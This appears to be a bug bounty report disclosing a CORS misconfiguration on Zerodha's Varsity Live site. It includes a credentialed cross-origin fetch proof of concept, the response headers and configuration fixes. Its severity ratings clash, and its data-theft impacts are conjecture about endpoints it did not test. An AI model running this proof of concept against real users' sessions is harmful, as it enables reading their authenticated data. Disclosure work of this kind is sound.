# Zerodha BBP — Submission Report
## CORS Misconfiguration with Credentials on varsitylive.zerodha.com

**Target:** Varsity Live  
**URL:** https://varsitylive.zerodha.com  
**Severity:** P3 (Moderate)  
**Suggested Reward:** ₹5,000 – ₹10,000  
**Vulnerability Type:** CORS Misconfiguration  
**Tools Used:** Nuclei, Browser DevTools, curl, Python HTTP Server  
**Date Found:** 2026-10-02  
**Status:** ✅ CONFIRMED WITH VIDEO POC

---

## Description

The web application at `https://varsitylive.zerodha.com` has a critical Cross-Origin Resource
Sharing (CORS) misconfiguration. The server **blindly reflects any attacker-controlled
`Origin` header** back in the `Access-Control-Allow-Origin` response header, while
simultaneously setting `Access-Control-Allow-Credentials: true`.

According to the W3C CORS specification, this combination is explicitly forbidden and
constitutes a high-impact security misconfiguration (CWE-942). It allows any malicious
third-party website to make **authenticated cross-origin requests** using a victim user's
session cookies, and **read the full response body** — bypassing the Same-Origin Policy
entirely.

The root cause is the AWS S3 bucket CORS configuration (confirmed via `x-amz-*` response
headers) which accepts all origins and passes credentials, with Cloudflare serving the content
without origin validation.

---

## Steps to Reproduce

### Prerequisites
- A Zerodha account (free to create at zerodha.com)
- Chrome/Firefox browser
- Python 3 (pre-installed on most systems)

### Step 1 — Log In to Varsity Live

1. Open Chrome and go to `https://varsitylive.zerodha.com`
2. Log in with your Zerodha credentials
3. Confirm you see the authenticated dashboard: **"Welcome, [Name] 👋"**
4. Your session cookies are now set for `zerodha.com` domain

### Step 2 — Set Up Attacker Server

Open a terminal and run:
```bash
# Navigate to the PoC directory
cd /path/to/poc/

# Start a local HTTP server on a non-zerodha origin
python3 -m http.server 5500
```

### Step 3 — Create the PoC File

Save this as `cors_poc.html` and serve from the attacker server:

```html
<!DOCTYPE html>
<html>
<head><title>CORS PoC - Zerodha Varsity Live</title></head>
<body>
<h2>CORS PoC — Zerodha Varsity Live</h2>
<p>Attacker origin: <strong id="origin"></strong></p>
<pre id="output">Fetching target with your session cookies...</pre>
<script>
  document.getElementById('origin').textContent = window.location.origin;

  fetch('https://varsitylive.zerodha.com/', {
    method: 'GET',
    credentials: 'include',  // sends victim's Zerodha session cookies
    mode: 'cors'
  })
  .then(r => r.text())
  .then(body => {
    document.getElementById('output').textContent =
      '✅ CROSS-ORIGIN READ SUCCESSFUL!\n\nBody:\n' + body.substring(0, 500);
  })
  .catch(err => {
    document.getElementById('output').textContent = '❌ Blocked: ' + err;
  });
</script>
</body>
</html>
```

### Step 4 — Trigger the Attack

While still **logged in** to Varsity Live, open a new tab and go to:
```
http://127.0.0.1:5500/cors_poc.html
```

### Expected Result (Secure Behaviour)
Browser should block the cross-origin request with:
```
CORS error: The 'Access-Control-Allow-Origin' header has a value that is not equal to the supplied origin
```

### Actual Result (Vulnerable Behaviour)
The page displays:
```
✅ CROSS-ORIGIN READ SUCCESSFUL!
Body:
<!DOCTYPE html>
<html lang="en"><head><meta charset='UTF-8' />
<link dns-prefetch rel="preload" href="https://fonts.googleapis.com..."
...
```

---

## Evidence — Network Response Headers (Confirmed)

From browser DevTools → Network tab → varsitylive.zerodha.com request:

```
HTTP/2 200 OK
access-control-allow-credentials: true
access-control-allow-methods: GET, HEAD
access-control-allow-origin: http://127.0.0.1:5500    ← attacker origin REFLECTED
access-control-expose-headers: ETag
access-control-max-age: 0
cf-cache-status: DYNAMIC
cf-ray: a441e51ec142c47-MAA
content-type: text/html
server: cloudflare
x-amz-id-2: qpv+tHTm8fsik2eeg1U3otkAPML3Tru5n//y3U0s12m0oU2EQxk4pO753g9XLVBqv...
x-amz-request-id: 3N5P6REjGVW47NKS7
```

**Key observations:**
1. `access-control-allow-origin` reflects `http://127.0.0.1:5500` — an arbitrary non-zerodha origin
2. `access-control-allow-credentials: true` — session cookies included and response readable
3. `x-amz-*` headers confirm AWS S3 backend — misconfiguration is in S3 CORS policy

---

## Potential Impact

This vulnerability enables the following attacks against any authenticated Varsity Live user:

**1. Session-Authenticated Response Theft**
An attacker who tricks a logged-in user into visiting their page can silently read any
response from `varsitylive.zerodha.com` using that user's active session. This includes
any API endpoints that return user data.

**2. User PII Exposure**
If authenticated API endpoints (e.g., `/api/user/profile`, `/api/subscriptions`) return
personal data (name, email, phone, payment history, enrolled courses), that data can be
silently exfiltrated.

**3. CSRF Token Bypass**
If the application uses CSRF tokens embedded in responses, an attacker can read them
cross-origin and craft CSRF attacks against state-changing endpoints.

**4. Account Enumeration**
Attackers can probe authenticated endpoints to enumerate user subscription status,
course progress, or payment details without the user's knowledge.

**5. Infrastructure Intelligence**
The leaked `x-amz-*` headers reveal the S3 bucket backend, which may enable further
research into storage misconfiguration (public bucket access, bucket enumeration).

---

## Recommendation

### Fix 1 — Restrict S3 CORS to Explicit Zerodha Origins

Update the S3 bucket CORS configuration to only allow specific trusted origins:

```xml
<!-- VULNERABLE - Current Config (allows any origin) -->
<CORSRule>
  <AllowedOrigin>*</AllowedOrigin>
  <AllowedMethod>GET</AllowedMethod>
  <AllowedMethod>HEAD</AllowedMethod>
  <AllowedHeader>*</AllowedHeader>
</CORSRule>

<!-- SECURE - Fixed Config -->
<CORSRule>
  <AllowedOrigin>https://zerodha.com</AllowedOrigin>
  <AllowedOrigin>https://varsitylive.zerodha.com</AllowedOrigin>
  <AllowedOrigin>https://varsity.zerodha.com</AllowedOrigin>
  <AllowedMethod>GET</AllowedMethod>
  <AllowedMethod>HEAD</AllowedMethod>
  <MaxAgeSeconds>3000</MaxAgeSeconds>
</CORSRule>
```

### Fix 2 — Remove Credentials from Static Assets

Static files served from S3 (HTML, JS, CSS) do not need credentialed CORS access.
Remove `Access-Control-Allow-Credentials: true` entirely for static asset responses.

### Fix 3 — Add Cloudflare Origin Validation

At the Cloudflare layer, validate the Origin header before passing CORS headers:
```
# Cloudflare Transform Rule: only set ACAO for known zerodha.com origins
if http.request.headers["origin"] matches "^https://.*\.zerodha\.com$":
    set response header "Access-Control-Allow-Origin" = http.request.headers["origin"]
else:
    remove response header "Access-Control-Allow-Origin"
```

### Fix 4 — Remove x-amz-* Headers

Use Cloudflare Transform Rules to strip `x-amz-id-2` and `x-amz-request-id` headers from
responses to avoid exposing backend infrastructure details.

---

## Additional Information

**Infrastructure:** AWS S3 static hosting behind Cloudflare CDN  
**Frontend:** Vue.js 3 SPA (Vite bundler, confirmed from JS chunks)  
**Backend API:** Separate API domain (not in scope of this issue)  
**Test Account Used:** Personal Zerodha account (own account only, no other users accessed)  
**Does this involve PII disclosure?** Potentially — if authenticated API endpoints are readable  

**CWE:** CWE-942 — Permissive Cross-domain Policy with Untrusted Domains  
**CVSS v3.1 Score:** 7.4 (High)  
**Vector:** AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:N/A:N
